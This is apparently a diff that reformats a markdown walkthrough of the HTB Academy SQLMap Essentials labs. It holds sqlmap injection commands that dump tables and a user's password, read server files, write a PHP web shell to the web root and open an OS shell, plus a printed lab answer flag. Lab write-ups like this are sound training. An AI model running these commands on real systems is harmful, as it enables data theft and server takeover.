@@ -87,7 +87,7 @@ Running SQLMap on an HTTP Request:
 Question: What's the contents of table flag2? (Case #2)
 Answer: HTB{700_much_c0n6r475_0n_p057_r3qu357}
 Method: first lets go to the browser to the website itself:
-http://<target-IP>:<target-port>/
+`http://<target-IP>:<target-port>/`
 
 
 
@@ -97,8 +97,8 @@ http://<target-IP>:<target-port>/
 
 ```bash
 sqlmap -u "http://<target-IP>:<target-port>/case2.php" --
-```
 data='id=1' --method POST --batch --dump
+```
 
 now, there will be A LOT of putput, only the relevant parts will be screenshot-
 ed:
@@ -155,8 +155,8 @@ When selecting 'click here' – we get to 'id=1' value:
 Anyway they tell us to investigate the url, with the cookie 'id=1', so lets do:
 ```bash
 sqlmap -u "http://<target-IP>:<target-port>/case3.php" --
-```
 cookie="id=1" --dbs --dump --batch --level=5 --risk=3
+```
 
 ![Figure 4.1 — Lab execution and output verification (Page 4)](/assets/images/posts/htb-academy/sqlmap-essentials/p004_01.jpg)
 *_Figure 4.1 — Lab execution and output verification (Page 4)_*
@@ -199,9 +199,9 @@ lets enter the page of 'case4' (the method for that already covered):
 In here we are dealing with json data: '{"id": 1}'. We will run the command:
 ```bash
 sqlmap -u "http://<target-ip>:<target-port>/case4.php" --
-```
 data='{"id": 1}' --dbs --dump --batch --level=5 --risk=3 --
 header="Content-Type: application/json"
+```
 and same as previous injections:
 
 ![Figure 6.1 — Lab execution and output verification (Page 6)](/assets/images/posts/htb-academy/sqlmap-essentials/p006_01.png)
@@ -223,8 +223,8 @@ and same as previous injections:
 
 ```bash
 sqlmap -u "http://<target-ip>:<target-port>/case5.php?id=1"
-```
 --dbs --dump --batch --level=5 --risk=3 -T flag5 --no-cast
+```
 
 
 
@@ -249,10 +249,9 @@ sqlmap -u "http://<target-ip>:<target-port>/case5.php?id=1"
 #### Technical Methodology & Exploit Execution:
 
 ```bash
-sqlmap -u "http://<target-IP>:<target-
-```
-port>/case6.php?col=id" --dbs --dump --batch --level=5 --
+sqlmap -u "http://<target-IP>:<target-port>/case6.php?col=id" --dbs --dump --batch --level=5 --
 risk=3 -T flag6 --no-cast
+```
 
 ![Figure 8.1 — Lab execution and output verification (Page 8)](/assets/images/posts/htb-academy/sqlmap-essentials/p008_01.jpg)
 *_Figure 8.1 — Lab execution and output verification (Page 8)_*
@@ -273,9 +272,9 @@ risk=3 -T flag6 --no-cast
 
 ```bash
 sqlmap -u "http://<target-IP>:<target-port>/case7.php?id=1"
-```
---union-cols=5 -D testdb -T flag7 –no-cast --dump --batch --
+--union-cols=5 -D testdb -T flag7 --no-cast --dump --batch --
 level=5 --risk=3
+```
 *
 
 ![Figure 9.1 — Lab execution and output verification (Page 9)](/assets/images/posts/htb-academy/sqlmap-essentials/p009_01.jpg)
@@ -307,9 +306,9 @@ level=5 --risk=3
 
 ```bash
 sqlmap -u "http://<target-IP>:<target-port>/case1.php?id=1"
-```
 -D testdb -T flag1 --no-cast --dump --batch --level=5 --
 risk=3
+```
 
 
 *
@@ -345,8 +344,8 @@ risk=3
 we run the command:
 ```bash
 sqlmap -u "http://<target-IP>:<target-port>/case1.php?id=1"
-```
 --search -C style --batch --level=5 --risk=3 --no-cast
+```
 
 
 *
@@ -373,9 +372,9 @@ We will also assume that the database is named 'testdb', and table is named
 Lets find the columns list for good order:
 ```bash
 sqlmap -u "http://<target-IP>:<target-port>/case1.php?id=1"
-```
 -D testdb -T users --columns --batch --level=5 --risk=3 --
 no-cast
+```
 
 
 *
@@ -386,9 +385,9 @@ Now that we are confident that the columns are 'name' and 'password', lets
 extract Kimberly's password:
 ```bash
 sqlmap -u "http://<target-IP>:<target-port>/case1.php?id=1"
-```
 -D testdb -T users --dump -C name,password --batch --level=5
 --risk=3 --no-cast --where "name LIKE '%Kimberly%'"
+```
 
 ![Figure 14.1 — Lab execution and output verification (Page 14)](/assets/images/posts/htb-academy/sqlmap-essentials/p014_01.jpg)
 *_Figure 14.1 — Lab execution and output verification (Page 14)_*
@@ -437,10 +436,10 @@ Now, we turn the interceptor on, and enter 'submit':
 
 ```bash
 sqlmap -u "http://<target-IP>:<target-port>/case8.php" --
-```
 data="id=1&t0ken=<token-value>" --csrf-token="t0ken" --batch
 --level=5 --risk=3 --dbs --dump -T flag8 --no-cast
-*in here <token-value> is 'Q0UZYzaFpsjkRsRGscxv0j3BbhWPDuVLRnrH3tpRdtA'
+```
+*in here `<token-value>` is 'Q0UZYzaFpsjkRsRGscxv0j3BbhWPDuVLRnrH3tpRdtA'
 but of course it may change for every request. *:
 
 *
@@ -465,13 +464,12 @@ but of course it may change for every request. *:
 
 There is a 'click here' button, lets click it:
 
-There are the parameters 'id=1&uid=<uid-value>'.
+There are the parameters 'id=1&uid=`<uid-value>`'.
 We need to randomize the uid. We ill use the command:
 ```bash
-sqlmap -u "http://<target-IP>:<target-
-```
-port>/case9.php?id=1&uid=12345" --randomize=uid --batch --
+sqlmap -u "http://<target-IP>:<target-port>/case9.php?id=1&uid=12345" --randomize=uid --batch --
 level=5 --risk=3 --dbs --dump -T flag9 --no-cast
+```
 
 ![Figure 18.1 — Lab execution and output verification (Page 18)](/assets/images/posts/htb-academy/sqlmap-essentials/p018_01.jpg)
 *_Figure 18.1 — Lab execution and output verification (Page 18)_*
@@ -494,8 +492,8 @@ This is a bit similar to case 2, so first lets try to run command to case2
 command:
 ```bash
 sqlmap -u "http://<target-IP>:<target-port>/case10.php" --
+data='id=1' --method POST --batch --dump -T flag10 --no-cast
 ```
-data='id=1' --method POST --batch --dump -T flag10 –no-cast
 
 ![Figure 19.1 — Lab execution and output verification (Page 19)](/assets/images/posts/htb-academy/sqlmap-essentials/p019_01.jpg)
 *_Figure 19.1 — Lab execution and output verification (Page 19)_*
@@ -521,9 +519,9 @@ At the end of the scan the results suggest to use '--random-agent'. And that is
 what we are going to do:
 ```bash
 sqlmap -u "http://<target-IP>:<target-port>/case10.php" --
-```
-data='id=1' --method POST --batch --dump -T flag10 –no-cast -
+data='id=1' --method POST --batch --dump -T flag10 --no-cast -
 -random-agent
+```
 
 
 *
@@ -557,8 +555,8 @@ We will use the tamperscript 'between':
 
 ```bash
 sqlmap -u "http://<target-IP>:<target-port>/case11.php?id=1"
-```
 --tamper=between --batch --level=5 --risk=3 --dbs --dump -T
+```
 flag11 --no-cast
 
 
@@ -602,8 +600,8 @@ Now as the target website has 'id=1' parameter:
 we will use the command:
 ```bash
 sqlmap -u "http://<target-IP>:<target-port>/?id=1" --is-dba
-```
 --batch
+```
 
 
 *
@@ -625,9 +623,8 @@ sqlmap -u "http://<target-IP>:<target-port>/?id=1" --is-dba
 Value 'True' means we do have DBA privileges, which is great! We may
 proceed:
 ```bash
-sqlmap -u "http://<target-IP>:<target-port>/?id=1" --file-
+sqlmap -u "http://<target-IP>:<target-port>/?id=1" --file-read "/var/www/html/flag.txt" --batch
 ```
-read "/var/www/html/flag.txt" --batch
 
 
 *
@@ -635,10 +632,8 @@ read "/var/www/html/flag.txt" --batch
 
 The file's content was saved in our machine in that file. Lets get it:
 ```bash
-cat /home/<attacking-box-
+cat /home/<attacking-box-user>/.local/share/sqlmap/output/<target-IP>/files/_var_www_html_flag.txt
 ```
-user>/.local/share/sqlmap/output/<target-
-IP>/files/_var_www_html_flag.txt
 
 ![Figure 24.1 — Lab execution and output verification (Page 24)](/assets/images/posts/htb-academy/sqlmap-essentials/p024_01.jpg)
 *_Figure 24.1 — Lab execution and output verification (Page 24)_*
@@ -667,9 +662,8 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```
 
 ```bash
-sqlmap -u "http://<target-IP>:<target-port>/?id=1" --file-
+sqlmap -u "http://<target-IP>:<target-port>/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
 ```
-write "shell.php" --file-dest "/var/www/html/shell.php"
 
 
 *
@@ -697,9 +691,8 @@ It works (and that flag is the already obtained flag, ignore that).
 Now sqlmap provides us with build in way to obtain a shell to the target
 machine, after shell.php is injected to it:
 ```bash
-sqlmap -u "http://<target-IP>:<target-port>/?id=1" --os-
+sqlmap -u "http://<target-IP>:<target-port>/?id=1" --os-shell --batch
 ```
-shell --batch
 
 
 *
@@ -757,7 +750,7 @@ anyway). We will have to find that post request manually.
 Most of the supposedly POST generated requests on this target website like
 review submitting or item checkout are disabled.
 So, We will use burpsuite for that task. Lets open burpsuite browser on proxy
-mode, and enter the website (enter the <target-IP:<target-port> on the URL):
+mode, and enter the website (enter the <target-IP:`<target-port>` on the URL):
 
 Lets go to Catalog → Shop:
 
@@ -793,9 +786,8 @@ Lets right-click the request, and save the item to a file 'request.txt':
 Now, there was some trial and error with the command parameters, especially
 the tamper to choose for the sql-injection, however this is the initial one:
 ```bash
-sqlmap -r request.txt --tamper=between --dump --batch --no-
+sqlmap -r request.txt --tamper=between --dump --batch --no-cast --level=5 --risk=3
 ```
-cast --level=5 --risk=3
 the command will base its attack based on the request stored in the
 'request.txt' file:
 
@@ -825,9 +817,8 @@ due to the command functionality will take some time – we will halt the
 current command, and run again more focused search, on the 'final_flag' table
 in 'production' database:
 ```bash
-sqlmap -r request.txt --tamper=between --dump --batch --no-
+sqlmap -r request.txt --tamper=between --dump --batch --no-cast --level=5 --risk=3 -D production -T final_flag
 ```
-cast --level=5 --risk=3 -D production -T final_flag
 
 ![Figure 31.1 — Lab execution and output verification (Page 31)](/assets/images/posts/htb-academy/sqlmap-essentials/p031_01.jpg)
 *_Figure 31.1 — Lab execution and output verification (Page 31)_*
